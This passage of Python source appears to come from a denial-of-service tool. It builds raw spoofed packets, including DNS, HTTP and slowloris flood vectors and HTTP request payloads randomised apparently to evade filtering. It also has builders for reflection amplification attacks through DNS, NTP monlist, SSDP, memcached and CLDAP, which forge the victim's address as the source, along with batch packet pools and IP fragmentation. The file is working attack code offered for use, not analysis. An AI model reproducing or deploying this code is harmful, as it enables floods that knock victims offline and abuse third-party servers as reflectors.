        src_port=src_port,
        dst_port=cfg.target_port,
        payload=dns_payload,
        src_ip_int=src_ip_int,
        dst_ip_int=dst_ip_int,
    )

    l4_data = bytes(udp_hdr) + dns_payload

    ip_hdr = build_ipv4_header(
        src_ip=src_ip_int or 0,
        dst_ip=dst_ip_int,
        protocol=PROTO_UDP,
        payload_len=len(l4_data),
        ttl=cfg.ttl or 64,
        tos=cfg.tos or 0,
    )

    packet = bytes(ip_hdr) + l4_data

    if cfg.pad_size > 0 and len(packet) < cfg.pad_size:
        packet += b"\x00" * (cfg.pad_size - len(packet))

    return packet


def build_polymorphic_http_packet(cfg: PacketConfig) -> bytes:
    """Build TCP packet with a polymorphic HTTP payload."""
    src_ip = _get_source_ip(cfg)
    src_ip_int = ip_to_int(src_ip) if src_ip != "0.0.0.0" else 0
    dst_ip_int = cfg.target_ip_int or ip_to_int(cfg.target_ip)
    src_port = random.randint(1024, 65535)

    profile = cfg.precomputed_profile or _select_os_profile()
    ttl = cfg.ttl if cfg.ttl is not None else profile.ttl

    # Polymorphic HTTP payload
    payload = _build_polymorphic_http_payload(cfg.target_ip)

    # TCP options
    if cfg.fixed_tcp_options_bytes:
        options_bytes = cfg.fixed_tcp_options_bytes
    else:
        options_bytes = _build_profile_tcp_options(profile)

    # TCP: PSH+ACK for data-carrying segment
    tcp_hdr = build_tcp_header(
        src_port=src_port,
        dst_port=cfg.target_port,
        seq=random.randint(0, 0xFFFFFFFF),
        ack=random.randint(0, 0xFFFFFFFF),
        flags=TCP_PSH | TCP_ACK,
        window=cfg.window or profile.window,
        options_bytes=options_bytes,
        src_ip_int=src_ip_int,
        dst_ip_int=dst_ip_int,
        payload=payload,
    )

    l4_data = bytes(tcp_hdr) + payload

    ip_hdr = build_ipv4_header(
        src_ip=src_ip_int or 0,
        dst_ip=dst_ip_int,
        protocol=PROTO_TCP,
        payload_len=len(l4_data),
        ttl=ttl,
        tos=cfg.tos or 0,
    )

    return bytes(ip_hdr) + l4_data


def _build_polymorphic_http_payload(
    target_ip: str,
    path: str = "/",
    method: str = "GET",
    user_agent: Optional[str] = None,
) -> bytes:
    """Generate a polymorphic HTTP request payload with randomized header order."""
    if not user_agent:
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) Safari/604.1",
        ]
        user_agent = random.choice(agents)

    headers = [
        ("Host", target_ip),
        ("User-Agent", user_agent),
        ("Accept", "*/*"),
        ("Accept-Language", random.choice(["en-US,en;q=0.5", "tr-TR,tr;q=0.9", "de-DE,de;q=0.8"])),
        ("Accept-Encoding", "gzip, deflate, br"),
        ("Connection", random.choice(["keep-alive", "close"])),
        ("Upgrade-Insecure-Requests", "1"),
        ("Cache-Control", random.choice(["max-age=0", "no-cache"])),
    ]

    # Shuffle for polymorphism
    random.shuffle(headers)

    # Case variation
    final_headers = []
    for key, value in headers:
        if random.random() > 0.5:
            key = key.lower()
        final_headers.append(f"{key}: {value}")

    # Whitespace polymorphism in request line
    sp1 = " " * random.randint(1, 3)
    sp2 = " " * random.randint(1, 3)
    request_line = f"{method}{sp1}{path}{sp2}HTTP/1.1"

    payload = request_line + "\r\n" + "\r\n".join(final_headers) + "\r\n\r\n"
    return payload.encode("ascii", errors="replace")


# ════════════════════════════════════════════════════════════════════════════
#  Master create_packet() Function  (API-compatible drop-in)
# ════════════════════════════════════════════════════════════════════════════

def create_packet(cfg: PacketConfig) -> bytes:
    """
    Create a raw IP packet from configuration.

    This is the main entry point — a drop-in replacement for packet.create_packet().
    Returns raw bytes (not a Scapy object).
    """
    if cfg.attack_vector == "dns":
        return build_dns_packet(cfg)
    elif cfg.attack_vector in ("http", "slowloris", "http2"):
        return build_polymorphic_http_packet(cfg)
    else:
        return build_transport_packet(cfg)


# ════════════════════════════════════════════════════════════════════════════
#  Batch Packet Pool (for pre-generating N packets at once)
# ════════════════════════════════════════════════════════════════════════════

def generate_packet_pool(
    cfg: PacketConfig,
    count: int,
    *,
    uniform_size: bool = True,
    low_peak_memory: bool = False,
) -> Tuple[bytes, int]:
    """
    Generate a pool of *count* packets as a flat contiguous buffer.

    If ``uniform_size`` is True (default), all packets are padded/truncated
    to the same size so the buffer can be indexed as ``pool[i * pkt_size : (i+1) * pkt_size]``.

    If ``low_peak_memory`` is True, packet pools are built without retaining
    a full list of per-packet temporary buffers (lower memory peak, more CPU work).

    Returns:
        (packets_buffer, packet_size)
    """
    if count <= 0:
        return b"", 0

    if uniform_size:
        if low_peak_memory:
            # Single-pass strategy with amortized stride growth.
            pkt_size = 0
            buf = bytearray()
            for i in range(count):
                pkt = create_packet(cfg)
                pkt_len = len(pkt)
                needed_pkt_size = (pkt_len + 3) & ~3

                if pkt_size == 0:
                    pkt_size = needed_pkt_size
                    buf = bytearray(pkt_size * count)
                elif needed_pkt_size > pkt_size:
                    # Grow stride geometrically to avoid repeated reallocations.
                    new_pkt_size = max(needed_pkt_size, (pkt_size * 3) // 2)
                    new_pkt_size = (new_pkt_size + 3) & ~3
                    new_buf = bytearray(new_pkt_size * count)
                    for j in range(i):
                        old_off = j * pkt_size
                        new_off = j * new_pkt_size
                        new_buf[new_off:new_off + pkt_size] = buf[old_off:old_off + pkt_size]
                    buf = new_buf
                    pkt_size = new_pkt_size

                offset = i * pkt_size
                buf[offset:offset + pkt_len] = pkt
            return bytes(buf), pkt_size
        else:
            packets: List[bytes] = []
            for _ in range(count):
                packets.append(create_packet(cfg))
            max_size = max(len(p) for p in packets)

        pkt_size = (max_size + 3) & ~3  # 4-byte aligned
        buf = bytearray(pkt_size * count)

        for i, pkt in enumerate(packets):
            offset = i * pkt_size
            buf[offset:offset + len(pkt)] = pkt
        return bytes(buf), pkt_size
    else:
        # Variable-size: just concatenate (no size info)
        if low_peak_memory:
            buf = bytearray()
            for _ in range(count):
                buf.extend(create_packet(cfg))
            return bytes(buf), 0

        packets: List[bytes] = []
        for _ in range(count):
            packets.append(create_packet(cfg))
        return b"".join(packets), 0


# ════════════════════════════════════════════════════════════════════════════
#  Amplification Packet Builders
# ════════════════════════════════════════════════════════════════════════════

def create_dns_amp_packet(reflector_ip: str, victim_ip: str, dns_name: str = "isc.org") -> bytes:
    """DNS amplification packet (ANY query via reflector)."""
    src_ip_int = ip_to_int(victim_ip)
    dst_ip_int = ip_to_int(reflector_ip)

    dns_payload = build_dns_query(
        qname=dns_name, qtype="ANY", recursive=True, edns=True
    )
    src_port = random.randint(1025, 65534)
    udp_hdr = build_udp_header(
        src_port, 53, dns_payload,
        src_ip_int=src_ip_int, dst_ip_int=dst_ip_int,
    )
    l4 = bytes(udp_hdr) + dns_payload
    ip_hdr = build_ipv4_header(src_ip_int, dst_ip_int, PROTO_UDP, len(l4))
    return bytes(ip_hdr) + l4


def create_ntp_amp_packet(reflector_ip: str, victim_ip: str) -> bytes:
    """NTP monlist amplification packet."""
    src_ip_int = ip_to_int(victim_ip)
    dst_ip_int = ip_to_int(reflector_ip)

    ntp_payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
    src_port = random.randint(1025, 65534)
    udp_hdr = build_udp_header(
        src_port, 123, ntp_payload,
        src_ip_int=src_ip_int, dst_ip_int=dst_ip_int,
    )
    l4 = bytes(udp_hdr) + ntp_payload
    ip_hdr = build_ipv4_header(src_ip_int, dst_ip_int, PROTO_UDP, len(l4))
    return bytes(ip_hdr) + l4


def create_ssdp_amp_packet(reflector_ip: str, victim_ip: str) -> bytes:
    """SSDP M-SEARCH amplification packet."""
    src_ip_int = ip_to_int(victim_ip)
    dst_ip_int = ip_to_int(reflector_ip)

    ssdp_payload = (
        'M-SEARCH * HTTP/1.1\r\n'
        'HOST: 239.255.255.250:1900\r\n'
        'MAN: "ssdp:discover"\r\n'
        'MX: 1\r\n'
        'ST: ssdp:all\r\n\r\n'
    ).encode()
    src_port = random.randint(1025, 65534)
    udp_hdr = build_udp_header(
        src_port, 1900, ssdp_payload,
        src_ip_int=src_ip_int, dst_ip_int=dst_ip_int,
    )
    l4 = bytes(udp_hdr) + ssdp_payload
    ip_hdr = build_ipv4_header(src_ip_int, dst_ip_int, PROTO_UDP, len(l4))
    return bytes(ip_hdr) + l4


def create_memcached_amp_packet(reflector_ip: str, victim_ip: str) -> bytes:
    """Memcached stats amplification packet."""
    src_ip_int = ip_to_int(victim_ip)
    dst_ip_int = ip_to_int(reflector_ip)

    payload = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
    src_port = random.randint(1025, 65534)
    udp_hdr = build_udp_header(
        src_port, 11211, payload,
        src_ip_int=src_ip_int, dst_ip_int=dst_ip_int,
    )
    l4 = bytes(udp_hdr) + payload
    ip_hdr = build_ipv4_header(src_ip_int, dst_ip_int, PROTO_UDP, len(l4))
    return bytes(ip_hdr) + l4


def create_ldap_amp_packet(reflector_ip: str, victim_ip: str) -> bytes:
    """CLDAP search amplification packet."""
    src_ip_int = ip_to_int(victim_ip)
    dst_ip_int = ip_to_int(reflector_ip)

    payload = (
        b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00'
        b'\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00'
        b'\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00'
    )
    src_port = random.randint(1025, 65534)
    udp_hdr = build_udp_header(
        src_port, 389, payload,
        src_ip_int=src_ip_int, dst_ip_int=dst_ip_int,
    )
    l4 = bytes(udp_hdr) + payload
    ip_hdr = build_ipv4_header(src_ip_int, dst_ip_int, PROTO_UDP, len(l4))
    return bytes(ip_hdr) + l4


# ════════════════════════════════════════════════════════════════════════════
#  IP Fragmentation
# ════════════════════════════════════════════════════════════════════════════

def fragment_packet(
    packet: bytes,
    fragment_size: int = 800,
) -> List[bytes]:
    """
    Fragment an IP packet into multiple fragments.

    Args:
        packet: Raw IPv4 packet bytes
        fragment_size: Maximum data per fragment (must be multiple of 8)

    Returns:
        List of fragment bytes (each is a complete IP packet)
    """
    if len(packet) < 20:
        return [packet]

    # Parse IP header
    ver_ihl = packet[0]
    ihl = (ver_ihl & 0xF) * 4
    total_len = struct.unpack("!H", packet[2:4])[0]
    effective_total_len = min(total_len, len(packet))
    if effective_total_len <= ihl:
        return [packet[:ihl]]

    ip_header = bytearray(packet[:ihl])
    payload = packet[ihl:effective_total_len]

    if len(payload) <= fragment_size:
        return [packet[:effective_total_len]]  # No fragmentation needed

    # Ensure fragment_size is multiple of 8
    fragment_size = (fragment_size // 8) * 8
    if fragment_size < 8:
        fragment_size = 8

    fragments = []
    offset = 0

    while offset < len(payload):
        chunk = payload[offset:offset + fragment_size]
        is_last = (offset + fragment_size >= len(payload))

        # Build fragment IP header
        frag_hdr = bytearray(ip_header)
        frag_offset_field = (struct.unpack("!H", ip_header[6:8])[0] & 0x8000) | (offset // 8)
        if not is_last:
            frag_offset_field |= 0x2000  # MF (More Fragments) flag

        struct.pack_into("!H", frag_hdr, 6, frag_offset_field)

        # Update total length
        frag_total = ihl + len(chunk)
        struct.pack_into("!H", frag_hdr, 2, frag_total)

        # Recalculate IP checksum
        struct.pack_into("!H", frag_hdr, 10, 0)
        cksum = _checksum(frag_hdr)
        struct.pack_into("!H", frag_hdr, 10, cksum)

        fragments.append(bytes(frag_hdr) + chunk)
        offset += fragment_size

    return fragments


# ════════════════════════════════════════════════════════════════════════════
#  Ethernet Framing Helper
# ════════════════════════════════════════════════════════════════════════════

def add_ethernet_frame(
    ip_packet: bytes,
    dst_mac: bytes = b"\xff\xff\xff\xff\xff\xff",
    src_mac: bytes = b"\x00\x00\x00\x00\x00\x00",
) -> bytes:
    """Prepend an Ethernet header to a raw IP packet."""
    eth = build_ethernet_header(dst_mac, src_mac)
    return eth + ip_packet


# ════════════════════════════════════════════════════════════════════════════
#  Compatibility Shim: make create_packet() return a Scapy-compatible object
# ════════════════════════════════════════════════════════════════════════════

class RawPacket:
    """
    Minimal packet wrapper that behaves like bytes but supports
    Scapy-like __bytes__() and __len__() for compatibility.
    """
    __slots__ = ("_data",)

    def __init__(self, data: bytes):
        self._data = data

    def __bytes__(self) -> bytes:
        return self._data

    def __len__(self) -> int:
        return len(self._data)

    def __repr__(self) -> str:
        return f"RawPacket({len(self._data)} bytes)"

    @property
    def data(self) -> bytes:
        return self._data

    def haslayer(self, _: object) -> bool:
        """Always returns False — layers are not tracked in raw mode."""
        return False
